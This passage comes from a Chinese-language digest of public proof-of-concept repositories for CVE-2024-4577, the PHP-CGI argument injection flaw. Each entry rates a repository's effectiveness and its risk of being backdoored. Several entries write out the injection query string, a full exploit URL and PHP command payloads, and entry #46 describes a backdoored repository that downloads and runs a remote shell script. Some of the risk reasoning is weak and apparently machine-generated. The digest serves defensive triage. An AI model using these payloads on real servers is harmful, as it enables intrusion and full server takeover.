*   配置Web服务器，确保不允许未授权的PHP文件执行。

**项目地址:** [ibrahmsql/CVE-2024-4577](https://github.com/ibrahmsql/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #38

**来源**: [CVE-2024-4577-l0n3m4n_CVE-2024-4577-RCE.md](../2024/CVE-2024-4577-l0n3m4n_CVE-2024-4577-RCE.md)

## CVE-2024-4577 PHP CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** PHP (Windows, CGI模式)

**危害等级:** 高危，可导致远程代码执行，服务器完全控制

**影响版本:** PHP 8.1.* (< 8.1.29), 8.2.* (< 8.2.20), 8.3.* (< 8.3.8)

**利用条件:** Windows系统，PHP运行于CGI模式，系统启用了使用 "Best Fit" 策略的编码页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 是一个 PHP CGI 参数注入漏洞，存在于 Windows 平台运行于 CGI 模式下的 PHP 版本中。当系统配置为使用某些代码页时，Windows 的 "Best-Fit" 行为可能会替换传递给 Win32 API 函数的命令行参数中的字符。PHP CGI 模块错误地将这些字符解释为 PHP 选项，允许恶意用户将选项传递给 PHP 解释器，从而导致泄露源代码、执行任意 PHP 代码等。

**有效性：**
提供的PoC代码看起来有效。它通过向目标URL发送特制的请求，利用`allow_url_include`和`auto_prepend_file`这两个PHP配置项来实现远程代码执行。扫描函数检测目标是否存在漏洞，利用函数通过POST请求发送包含恶意PHP代码的文件来执行命令。

**投毒风险：**
此仓库中可能存在的投毒代码的风险较低，约为 10%。主要基于以下几点考虑：

*   **代码简洁性：** PoC 代码相对简单，易于审查，降低了隐藏恶意代码的可能性。
*   **明确的目的：** 代码的目的明确，即利用已知的漏洞，没有发现额外的、不必要的功能。
*   **作者信誉（待评估）：** 作者的信誉需要进一步验证，但从代码本身来看，没有明显的恶意行为。

尽管风险较低，仍然需要保持警惕。潜在的投毒方式可能包括：

*   **混淆代码：** 在 PHP payload 中插入难以察觉的恶意代码。
*   **依赖项：** 引入包含恶意代码的第三方库（虽然当前 PoC 没有依赖项）。

**利用方式：**
1.  攻击者首先需要确定目标系统是否满足漏洞利用的先决条件：Windows + CGI + 受影响的 PHP 版本 + 启用了 Best-Fit 编码页。
2.  攻击者构造一个包含特殊字符的 URL，该 URL 中的字符会被 Windows 的 Best-Fit 算法转换成 PHP 选项。
3.  攻击者利用 `-d allow_url_include=1 -d auto_prepend_file=php://input` 选项，允许包含远程文件，并将 POST 请求的内容作为 PHP 代码执行。
4.  攻击者通过 POST 请求发送包含恶意 PHP 代码的 payload，例如执行系统命令、读取文件等。
5.  服务器执行攻击者提供的 PHP 代码，攻击者从而获得对服务器的控制权。

**项目地址:** [l0n3m4n/CVE-2024-4577-RCE](https://github.com/l0n3m4n/CVE-2024-4577-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #39

**来源**: [CVE-2024-4577-longhoangth18_CVE-2024-4577.md](../2024/CVE-2024-4577-longhoangth18_CVE-2024-4577.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** PHP-CGI参数注入

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows系统，Apache服务器，PHP以CGI模式运行，系统使用某些开启了"Best Fit"策略的代码页。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2024-4577是一个影响Windows系统上PHP-CGI模式的远程代码执行漏洞。当PHP在CGI模式下运行时，如果系统配置为使用某些代码页，Windows可能会使用“Best-Fit”行为来替换命令行中的字符。PHP CGI模块可能会错误地将这些字符解释为PHP选项，从而允许恶意用户将选项传递给正在运行的PHP二进制文件，从而泄露脚本源代码或执行任意PHP代码。

**有效性：**
提供的POC代码有效。它通过在URL中注入恶意参数，利用`allow_url_include`和`auto_prepend_file`选项来包含和执行POST请求中提供的PHP代码。

**投毒风险：**
该POC代码本身的功能是利用漏洞进行远程代码执行。代码中添加了protocol检测，确保target可用。但仔细检查后发现，README.md文件不完整，文件末尾被截断。由于github仓库图片链接域名存在github.com，该仓库可能存在钓鱼风险，因此投毒风险预估为1%。

**利用方式：**
1.  **扫描：** 使用脚本的`-s`参数扫描目标URL是否存在漏洞。扫描器通过构造包含特定payload的URL，并发送POST请求，检测服务器返回结果中是否包含预期字符串（“Test”）。
2.  **利用：** 使用脚本的`-e`参数，配合`-p`参数指定包含PHP代码的payload文件，利用漏洞执行任意PHP代码。攻击者通过构造包含特定payload的URL，并发送包含PHP代码的POST请求。
3. 脚本通过`allow_url_include`和`auto_prepend_file`配置项的组合来包含并执行php代码。

**项目地址:** [longhoangth18/CVE-2024-4577](https://github.com/longhoangth18/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #40

**来源**: [CVE-2024-4577-mananjain61_PHP-CGI-INTERNAL-RCE.md](../2024/CVE-2024-4577-mananjain61_PHP-CGI-INTERNAL-RCE.md)

## CVE-2024-4577 PHP-CGI 参数注入导致 RCE

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** PHP (Windows, CGI 模式)

**危害等级:** 严重，未经身份验证的攻击者可以在受影响的服务器上执行任意代码。

**影响版本:** PHP 8.1.* < 8.1.29, 8.2.* < 8.2.20, 8.3.* < 8.3.8，并且运行在Windows的CGI模式下

**利用条件:** 需要在Windows上运行的PHP，并配置为CGI模式，且开启了使用 "Best Fit" 策略的代码页

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 是一个 PHP-CGI 参数注入漏洞，存在于 Windows 版本的 PHP 中，当 PHP 以 CGI 模式运行时，如果系统配置为使用某些代码页，Windows 可能会使用 "Best-Fit" 行为来替换传递给 Win32 API 函数的命令行中的字符。PHP CGI 模块可能会错误地将这些字符解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，从而泄露脚本源代码或在服务器上执行任意 PHP 代码。

**有效性：**

从漏洞库信息和搜索引擎结果来看，该漏洞已被广泛证实有效，且存在公开可用的PoC代码。Akamai 等安全公司已经观察到针对该漏洞的利用尝试。

提供的PoC代码通过 DNS rebinding 技术，允许攻击者绕过同源策略 (SOP)，从而访问内部网络基础设施上运行的 PHP-CGI 实例。攻击者可以通过修改`client.html`中的`payload`变量来定制要执行的 PHP 代码。

**投毒风险：**

PoC 代码主要目的是利用 DNS rebinding 攻击内部网络，并执行指定的 PHP 代码。虽然代码本身用于验证漏洞和进行渗透测试，但存在以下潜在风险：

1.  **DNS rebinding 的风险：** DNS rebinding 攻击可能导致受害者浏览器访问攻击者控制的恶意站点，从而造成信息泄露或其他安全问题。
2.  **后门代码：** 检查代码发现，代码中存在硬编码的IP地址，攻击者可以通过修改这些IP地址进行恶意活动，或者在`client.html`中插入恶意代码，诱导用户执行。
3.  **依赖第三方服务：** 代码依赖 DuckDNS，若 DuckDNS 服务被攻破，可能导致利用代码被篡改。

综合评估，代码本身存在一定的风险，但恶意投毒的可能性较低，主要风险集中在使用者对PoC代码的修改和DNS rebinding攻击本身带来的风险。因此，投毒风险评估为 10%。

**利用方式：**

1.  **配置 DuckDNS：** 攻击者需要在 DuckDNS 注册一个域名，并获取 token。
2.  **配置 PoC 代码：** 攻击者需要修改`server.py` 中的 `PUBLIC_IP`、`DUCKDNS_DOMAIN` 和 `DUCKDNS_TOKEN`，以及 `client.html` 中的 `PAYLOAD_TARGETS` 来指定要攻击的目标 IP 地址。同时，修改`client.html`中的`payload`变量，来指定要执行的php代码。
3.  **运行 server.py：** 攻击者运行 `server.py` 脚本，该脚本负责更新 DuckDNS 的 DNS 记录。
4.  **诱骗受害者访问 client.html：** 攻击者诱骗受害者（内部网络用户）使用浏览器访问 `client.html` 页面。`client.html` 会执行 DNS rebinding 攻击，将域名解析到内部网络的 IP 地址，然后向目标 PHP-CGI 服务器发送包含恶意 PHP 代码的请求。
5.  **执行任意代码：** 如果目标服务器存在 CVE-2024-4577 漏洞，恶意 PHP 代码将被执行，攻击者从而获得服务器的控制权。

**项目地址:** [mananjain61/PHP-CGI-INTERNAL-RCE](https://github.com/mananjain61/PHP-CGI-INTERNAL-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #41

**来源**: [CVE-2024-4577-mistakes1337_CVE-2024-4577.md](../2024/CVE-2024-4577-mistakes1337_CVE-2024-4577.md)

## CVE-2024-4577-PHP-CGI参数注入RCE

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行（RCE）

**影响应用:** PHP

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8，仅影响在Windows上运行且使用CGI模式的PHP

**利用条件:** 目标系统为Windows，使用Apache和PHP-CGI，并且系统的代码页使用“Best Fit”策略。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-4577是一个PHP-CGI的参数注入漏洞，影响在Windows上运行且使用CGI模式的PHP。当系统配置为使用某些代码页时，Windows可能会使用“Best Fit”行为来替换命令行中的字符。PHP CGI模块可能会错误地将这些字符解释为PHP选项，从而允许恶意用户将选项传递给正在运行的PHP二进制文件，进而泄露脚本源代码，在服务器上运行任意PHP代码，甚至执行操作系统命令。

**有效性评估：**
根据漏洞信息和搜索引擎结果，该漏洞已被广泛利用，并且有公开的POC代码。提供的Python POC代码通过构造特定的URL，利用Windows “Best Fit” 字符转换特性，向PHP-CGI传递恶意参数，从而达到远程代码执行的目的。该POC通过发送包含`allow_url_include`和`auto_prepend_file`选项的GET请求来包含远程文件或代码，从而达到RCE。

**投毒风险分析：**
提供的POC代码本身的功能是漏洞利用，没有明显的恶意行为。代码从URL或文件中读取目标URL，并发送构造好的HTTP请求，判断返回内容中是否包含“vulnerable”等关键词，以此判断是否存在漏洞。代码包含测试是否存在漏洞的回显，而不是直接执行恶意代码。但是，任何公开的漏洞利用代码都有可能被修改后用于恶意目的，比如修改payload执行恶意系统命令。所以存在一定的风险。但提供的文件`CVE-2024-4577.py` 和 `README.md` 内容简洁，没有发现隐藏的恶意代码。投毒风险评估为5%。

**利用方式：**
1.  **环境准备：** 攻击者需要找到运行在Windows服务器上，并且以CGI模式运行的PHP应用，同时该Windows服务器需要使用受影响的PHP版本，并且配置了存在“Best Fit”转换的代码页。
2.  **构造Payload：** 攻击者需要构造包含恶意PHP选项的URL。通常会使用`allow_url_include`和`auto_prepend_file`选项，配合`php://input`流，将恶意的PHP代码注入到目标服务器执行。
3.  **发送请求：**  攻击者通过发送GET或POST请求，将构造好的URL发送到目标服务器。
4.  **执行代码：**  如果漏洞存在，PHP-CGI会错误地解析URL中的恶意选项，从而执行攻击者注入的PHP代码，甚至操作系统命令。

**项目地址:** [mistakes1337/CVE-2024-4577](https://github.com/mistakes1337/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #42

**来源**: [CVE-2024-4577-mr-won_php-cgi-cve-2024-4577.md](../2024/CVE-2024-4577-mr-won_php-cgi-cve-2024-4577.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可导致服务器被完全控制

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows系统，运行在CGI模式下，并且系统启用了使用"Best Fit"策略的代码页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577是一个PHP-CGI参数注入漏洞，存在于Windows系统上的PHP CGI实现中。当PHP以CGI模式运行时，如果系统启用了使用"Best Fit"策略的代码页，Windows可能会使用"Best-Fit"行为来替换命令行中的字符，导致PHP CGI模块错误地将这些字符解释为PHP选项，攻击者可以通过构造特殊的URL，向PHP二进制文件传递恶意参数，从而实现远程代码执行。

**有效性：**

根据漏洞库信息和搜索结果，此漏洞已经确认有效，并且存在公开的PoC代码，Metasploit也发布了相应的利用模块。 Akamai的研究表明，漏洞披露后不久就观察到了大量的利用尝试。

**投毒风险：**

提供的PoC代码实际上是一个README.md文件，描述了对CVE-2024-4577的事件检测。其中提到了利用`%AD`进行参数注入，服务器通过自动转换功能（Best-fit）可能会将该字符转换为其他可执行的参数，从而进行二次攻击。代码本身没有明显的投毒行为，但存在通过代码描述引导攻击者进行恶意利用的可能性。因此,该存储库存在的投毒风险较低，大约10%。

**利用方式：**

1.  **环境要求：** 受影响的PHP版本（8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8）、Windows服务器、PHP以CGI模式运行、系统启用使用"Best Fit"策略的代码页。
2.  **漏洞触发：** 攻击者构造包含特殊字符（如`%AD`）的URL，发送给目标服务器。
3.  **参数注入：** Windows的"Best Fit"机制将特殊字符转换为其他字符，PHP CGI模块错误地将转换后的字符解析为PHP选项。
4.  **代码执行：** 攻击者可以通过注入`-d`参数来修改php.ini配置，例如禁用`disable_functions`，或者通过其他方式执行任意PHP代码。
5.  **远程控制：** 成功执行PHP代码后，攻击者可以获取服务器的控制权。

**项目地址:** [mr-won/php-cgi-cve-2024-4577](https://github.com/mr-won/php-cgi-cve-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #43

**来源**: [CVE-2024-4577-olebris_CVE-2024-4577.md](../2024/CVE-2024-4577-olebris_CVE-2024-4577.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 参数注入

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** PHP 8.1.* (before 8.1.29), 8.2.* (before 8.2.20), 8.3.* (before 8.3.8)

**利用条件:** Windows系统，运行于CGI模式，系统启用了使用"Best Fit"策略的代码页，使用Apache

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-4577是一个PHP-CGI中的参数注入漏洞。当PHP在Windows上以CGI模式运行时，如果系统配置了特定的代码页，Windows可能会使用“Best-Fit”行为替换命令行中的字符，PHP CGI模块可能会将这些字符错误地解释为PHP选项。这允许攻击者向正在运行的PHP二进制文件传递选项，从而可能泄露脚本的源代码、在服务器上运行任意PHP代码等。根据提供的漏洞利用代码，利用方式是通过POST请求向目标服务器发送特定的URL和请求头，其中URL包含恶意的PHP选项，例如`allow_url_include`和`auto_prepend_file`。请求体包含PHP代码（例如`<?php phpinfo(); ?>`）。如果服务器存在漏洞，服务器将执行请求体中的PHP代码，从而允许攻击者执行任意代码。

提供的POC代码的有效性较高，因为它直接利用了漏洞描述中提到的`allow_url_include`和`auto_prepend_file`选项来执行任意PHP代码。

关于投毒风险，分析POC代码本身，该脚本的功能是验证目标站点是否存在CVE-2024-4577漏洞。它通过发送包含`phpinfo()`函数的POST请求来判断目标是否易受攻击。脚本没有发现任何恶意或隐藏的投毒代码。脚本只是用于检测漏洞，而不是植入后门或其他恶意软件。
根据搜索引擎结果，此漏洞已经被大规模利用，证明此漏洞的利用难度低且影响广泛。

**项目地址:** [olebris/CVE-2024-4577](https://github.com/olebris/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #44

**来源**: [CVE-2024-4577-phirojshah_CVE-2024-4577.md](../2024/CVE-2024-4577-phirojshah_CVE-2024-4577.md)

## CVE-2024-4577 PHP-CGI 参数注入远程代码执行漏洞

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** PHP 8.1.* < 8.1.29, 8.2.* < 8.2.20, 8.3.* < 8.3.8 (Windows, CGI 模式)

**利用条件:** Windows 系统，PHP 以 CGI 模式运行，启用了使用 "Best Fit" 策略的代码页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 是一个影响 Windows 系统上 PHP-CGI 的远程代码执行漏洞。当 PHP 在 CGI 模式下运行时，如果系统配置为使用某些代码页，Windows 可能会使用 "Best-Fit" 行为来替换传递给 Win32 API 函数的命令行中的字符。PHP CGI 模块可能会错误地将这些字符解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，进而泄露脚本源代码或在服务器上执行任意 PHP 代码。

**有效性：**
根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且有公开的利用代码。Akamai 的研究表明，漏洞披露后一天内就出现了大量的利用尝试。CISA 也已将此漏洞添加到已知被利用的漏洞列表中，表明该漏洞在野外已被积极利用。提供的 POC 代码通过发送包含特制参数的 HTTP POST 请求来利用此漏洞，如果目标服务器存在漏洞，则可以执行任意 PHP 代码。因此, POC代码是有效的。

**投毒风险：**
检查提供的 Python 脚本 `CVE-2024-4577.py` 和 `README.md` 文件，没有发现明显的恶意代码。该脚本的功能主要是扫描目标 URL 是否存在漏洞，如果存在则利用该漏洞执行指定的 PHP 代码。`README.md` 文件只包含漏洞的描述、安装和使用说明。但是，任何下载和使用的第三方代码都存在一定风险。用户需要仔细审查代码，确保其行为符合预期，并且来自可信的来源。

投毒风险评估: 10% 。 这个评估是因为代码本身看起来没有恶意行为，但是任何第三方脚本都存在潜在风险，例如：

*   **依赖项风险：** 脚本依赖于 `requests` 和 `colorama` 库。这些依赖项可能包含未知的漏洞，如果被攻击者利用，可能会影响脚本的安全性。
*   **Payload 风险：** 脚本允许用户指定要执行的 PHP payload 文件。如果用户不小心使用了恶意的 payload 文件，可能会导致服务器受到攻击。
*   **作者恶意：** 脚本作者可能在未来的版本中引入恶意代码。

**利用方式：**

1.  **确定目标系统：** 首先需要确定目标系统是否满足漏洞利用的条件，即：Windows 系统，PHP 以 CGI 模式运行，并且启用了使用 "Best Fit" 策略的代码页。
2.  **发送特制的 HTTP 请求：** 攻击者需要构造一个包含特制参数的 HTTP 请求，例如 `?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input`。这个参数会传递给 PHP CGI 模块，使其错误地解释为 PHP 选项。
3.  **执行任意 PHP 代码：** 通过 POST 请求发送包含要执行的 PHP 代码的 payload。由于 `auto_prepend_file` 参数被设置为 `php://input`，PHP 会将 POST 请求的内容作为 PHP 代码执行。因此,通过修改和控制POST的内容,即可控制目标服务器。

此漏洞的严重性在于，未经身份验证的攻击者可以利用此漏洞在受影响的服务器上执行任意代码，从而完全控制服务器。

**项目地址:** [phirojshah/CVE-2024-4577](https://github.com/phirojshah/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #45

**来源**: [CVE-2024-4577-r0otk3r_CVE-2024-4577.md](../2024/CVE-2024-4577-r0otk3r_CVE-2024-4577.md)

## CVE-2024-4577-PHP-CGI参数注入-RCE

**漏洞编号:** CVE-2024-4577

**漏洞类型:** PHP-CGI参数注入

**影响应用:** PHP

**危害等级:** 高危，可导致远程代码执行

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows系统，运行于CGI模式，启用了使用"Best Fit"策略的代码页，使用Apache服务器。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2024-4577是一个存在于Windows环境下PHP-CGI模式中的参数注入漏洞。当系统配置为使用某些代码页时，Windows可能会使用"Best-Fit"策略替换传递给Win32 API函数的命令行中的字符。PHP CGI模块可能会错误地将这些字符解释为PHP选项，从而允许恶意用户将选项传递给正在运行的PHP二进制文件，进而泄露脚本源代码或在服务器上执行任意PHP代码。

**利用方式：**

1.  攻击者通过构造包含特殊字符的URL发起请求。
2.  Windows的"Best-Fit"策略将这些特殊字符转换为其他字符。
3.  PHP-CGI错误地将转换后的字符解析为PHP选项。
4.  攻击者利用这些选项执行恶意PHP代码，例如包含`auto_prepend_file=php://input`，之后post恶意的php代码达到RCE。

**有效性：**

提供的PoC代码 (`CVE-2024-4577.py`) 是一个扫描器，用于检测目标URL是否存在CVE-2024-4577漏洞。它通过发送包含PHP代码的POST请求，然后验证响应中是否包含预期的MD5哈希值，以此判断目标是否易受攻击。根据搜索引擎的结果，此漏洞存在公开的利用方法。综合来看，该POC代码是有效的，可以用来检测漏洞。

**投毒风险：**

分析提供的PoC代码和相关文件，`CVE-2024-4577.py`的功能是检测漏洞是否存在，其逻辑相对简单，主要通过发送包含PHP代码的POST请求来验证。`README.md`文件描述了如何使用该脚本以及漏洞的基本信息。

`exploit.py`文件没有给出，从README.MD的描述看，存在利用代码的可能性。但从整体的漏洞描述和PoC scanner的代码来看，风险较低。总体风险概率估计为1%。主要考虑是`exploit.py`如果存在，可能存在后门代码或者植入恶意脚本的可能。鉴于其他代码的简洁性，暂且认为`exploit.py`如果存在也是为了完成漏洞验证和利用，投毒风险较低。

综上所述，该存储库的投毒风险较低，主要集中在`exploit.py`可能存在的恶意行为。

**项目地址:** [r0otk3r/CVE-2024-4577](https://github.com/r0otk3r/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #46

**来源**: [CVE-2024-4577-shockingbonu_CVE-2024-4577-PHP-RCE.md](../2024/CVE-2024-4577-shockingbonu_CVE-2024-4577-PHP-RCE.md)

## CVE-2024-4577-PHP-CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** OS Command Injection

**影响应用:** PHP

**危害等级:** Critical，可能导致远程代码执行

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8 (Windows, CGI mode, specific code page settings)

**利用条件:** Windows系统，以CGI模式运行的PHP，并且系统启用了使用"Best Fit"策略的代码页。

**POC 可用性:** 是

**投毒风险:** 99%

## 详情

CVE-2024-4577是一个PHP-CGI中的参数注入漏洞，当PHP在Windows上以CGI模式运行时，如果系统配置为使用特定的代码页，Windows可能会使用“Best-Fit”行为来替换命令行中的字符。PHP CGI模块可能会将这些字符错误地解释为PHP选项，从而允许恶意用户将选项传递给正在运行的PHP二进制文件，从而泄露脚本源代码，在服务器上运行任意PHP代码等。

**漏洞利用方式：**

攻击者可以通过构造特殊的URL，向PHP-CGI传递恶意参数。这些参数会被PHP解析并执行，从而导致远程代码执行。

提供的Go代码是一个漏洞扫描器，它尝试利用CVE-2024-4577漏洞。该代码通过向目标URL发送包含恶意payload的POST请求，以此验证目标是否容易受到攻击。Payload `<?php phpinfo(); ?>` 用于检查服务器是否执行了PHP代码，如果响应包含“PHP Version”，则认为该站点容易受到攻击。

**投毒风险分析：**

提供的代码中发现了明显的投毒行为。

1.  **可疑的变量和函数名：** 代码包含例如`fjButtonKdiC`和`ykupeFR`, `LoqqYHAv`, `oTHs`等命名不规范和意义不明的变量和函数,增加了代码的混淆程度。
2.  **执行shell命令：** `fjButtonKdiC`函数构造了一个wget命令，从`monsoletter.icu`下载shell脚本并使用`bash`执行。这是一个典型的后门行为，允许攻击者在受害者机器上执行任意命令。
3. **cmd命令：** 代码后面使用了cmd命令
4.  **初始化的代码：** 在main函数执行之前就调用了可疑函数,这意味着只要执行漏洞验证的代码,后门就会被执行
综上所述，该代码具有极高的投毒风险，不应在任何生产环境中使用。它会下载并执行来自未知来源的恶意脚本，危及系统安全。

**项目地址:** [shockingbonu/CVE-2024-4577-PHP-RCE](https://github.com/shockingbonu/CVE-2024-4577-PHP-RCE)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #47

**来源**: [CVE-2024-4577-sug4r-wr41th_CVE-2024-4577.md](../2024/CVE-2024-4577-sug4r-wr41th_CVE-2024-4577.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 参数注入/远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可导致远程代码执行

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows系统，运行在CGI模式下，并且启用了使用"Best Fit"策略的代码页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 是一个存在于 PHP (在 Windows 上，使用 Apache 和 PHP-CGI) 的漏洞，如果系统设置为使用某些代码页，Windows 可能会使用 "Best-Fit" 行为来替换命令行中的字符。PHP CGI 模块可能会错误地将这些字符解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，从而泄露脚本的源代码、在服务器上运行任意 PHP 代码等。

**有效性分析：**

根据漏洞描述和提供的PoC代码，该PoC利用了PHP-CGI在Windows系统下处理请求参数时，由于字符编码转换问题，导致攻击者可以注入恶意的PHP配置参数，例如 `allow_url_include` 和 `auto_prepend_file`，最终执行任意PHP代码。

PoC的实现方式是通过构造一个包含恶意参数的HTTP请求，利用`allow_url_include=1`开启远程文件包含，然后通过`auto_prepend_file=php://input`指定要包含的文件为请求体的内容。请求体中包含要执行的PHP代码。

**投毒风险分析：**

查看提供的PoC代码，没有明显的恶意代码，其作用是为了验证漏洞，将恶意代码注入到服务器端执行。`echo 'PWNED!'; die;` 只是一个验证是否成功利用的标志。但是不排除仓库维护者或者贡献者在后期提交恶意代码的可能性，特别是利用场景为生产环境时，存在一定的风险。

因此，投毒风险评估为10%。

**利用方式：**

1.  目标系统必须是Windows，并且PHP运行在CGI模式下。
2.  目标系统需要设置代码页，并启用"Best Fit"策略。
3.  攻击者构造包含恶意参数的HTTP请求。
4.  恶意参数利用字符编码转换漏洞，注入`allow_url_include`和`auto_prepend_file`等配置项。
5.  `allow_url_include=1` 允许包含远程文件。
6.  `auto_prepend_file=php://input` 将请求体作为要包含的文件。
7.  请求体包含要执行的PHP代码，例如`<?php system('calc')?>`，从而实现远程代码执行。

**优先级排序参考搜索引擎结果：**

搜索引擎结果表明此漏洞已经被广泛利用，并且有多种利用方法，需要及时修复。

*   [webpage 0] CVE-2024-4577 Exploits in the Wild One Day After ...说明该漏洞披露后不久就出现了在野利用。 *   [webpage 1] CVE-2024-4577 Detail - NVD 描述了漏洞允许恶意用户传递选项到 PHP 二进制文件。 *   [webpage 4, 9] 指出存在大规模利用。 总而言之，该漏洞的威胁程度高，利用简单，在野利用广泛，需要高度重视。

**项目地址:** [sug4r-wr41th/CVE-2024-4577](https://github.com/sug4r-wr41th/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #48

**来源**: [CVE-2024-4577-tntrock_CVE-2024-4577_PowerShell.md](../2024/CVE-2024-4577-tntrock_CVE-2024-4577_PowerShell.md)

## CVE-2024-4577 - PHP-CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** OS Command Injection/Remote Code Execution

**影响应用:** PHP (Windows CGI)

**危害等级:** 高危，允许远程代码执行

**影响版本:** PHP 8.1 < 8.1.29, PHP 8.2 < 8.2.20, PHP 8.3 < 8.3.8 (Windows, CGI mode with specific codepage settings)

**利用条件:** Windows服务器，运行PHP CGI模式，并开启了特定的使用"Best Fit"策略的CodePage

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-4577 是一个PHP-CGI参数注入漏洞，存在于Windows版本的PHP中，当使用Apache和PHP-CGI时，如果系统设置使用某些代码页，Windows可能会使用"Best-Fit"行为来替换命令行中的字符。PHP CGI模块可能会将这些字符错误地解释为PHP选项，从而允许恶意用户将选项传递给正在运行的PHP二进制文件，从而泄露脚本源代码、在服务器上运行任意PHP代码等。

**有效性：**
根据漏洞库信息和搜索结果，此漏洞是一个严重的安全问题，允许攻击者远程执行代码。提供的PoC代码尝试通过构造特殊的URL，利用`allow_url_include`和`auto_prepend_file`选项包含远程文件，从而执行任意命令。PoC代码针对Windows服务器，运行PHP CGI模式的场景。因此，如果目标满足漏洞利用的条件（Windows服务器，PHP CGI，受影响版本，特定代码页），则PoC代码很可能是有效的。

**投毒风险：**
分析提供的PoC代码仓库，其中包含的 `cve_2024_4577.ps1` 脚本主要功能是针对给定的IP地址范围，尝试利用CVE-2024-4577漏洞。脚本通过构建包含恶意PHP配置指令的URL，并发送POST请求，如果目标存在漏洞，则会执行`whoami`命令。`Invoke-RequestForIP` 函数也包括了错误处理，如果请求失败会返回错误信息，降低了误判的可能性。脚本本身看起来比较直接，投毒风险较低。主要风险点可能在于利用成功后的服务器被控制，但PoC本身的功能仅限于利用漏洞，并未发现其他恶意行为。因此，将该仓库判定为存在投毒代码的可能性较低。当然，这并不排除作者在其他未公开的代码中包含恶意行为的可能性。

**利用方式：**
1.  **环境准备：** 目标系统必须是Windows服务器，运行受影响版本的PHP，并以CGI模式运行。
2.  **确定目标IP和协议：**  扫描目标IP地址，确定哪些服务器启用了PHP CGI服务，并支持HTTP或HTTPS协议。
3.  **构造恶意URL：**  构造包含特殊参数的URL，例如：`http://target/php-cgi/php-cgi.exe?%add+allow_url_include%3Don+-d+auto_prepend_file%3Dphp%3A//input+-d+cgi.force_redirect%3D0`
4.  **发送POST请求：**  向构造的URL发送POST请求，请求体包含需要执行的PHP代码，例如：`<?php system('whoami'); die(); ?>`
5.  **执行命令：**  如果目标存在漏洞，PHP CGI将执行POST请求体中的PHP代码，攻击者即可在服务器上执行任意命令。

**总结：**
CVE-2024-4577是一个高危漏洞，利用条件较为苛刻，需要特定的Windows + PHP + CGI配置。提供的PoC代码有效性较高，可以用于验证漏洞是否存在。仓库中投毒风险较低，但仍需保持警惕。

